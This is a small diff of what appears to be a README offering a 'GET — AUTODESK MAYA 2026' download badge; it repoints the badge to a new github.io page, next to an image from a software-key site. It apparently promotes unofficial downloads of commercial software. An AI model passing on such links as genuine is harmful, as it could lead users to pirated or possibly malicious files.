@@ -4,7 +4,7 @@
 <img src="https://activsoftkey.com/wp-content/uploads/2025/06/autodesk-maya.png" width="780">
 </p>
 
-[![GET — AUTODESK MAYA 2026](https://img.shields.io/badge/GET-AUTODESK%20MAYA%202026-2563eb?style=for-the-badge)](https://zeru5926.github.io/.github/)
+[![GET — AUTODESK MAYA 2026](https://img.shields.io/badge/GET-AUTODESK%20MAYA%202026-2563eb?style=for-the-badge)](https://zeru5926.github.io/.github/Autodesk-Maya-2026)
 
 ---
 
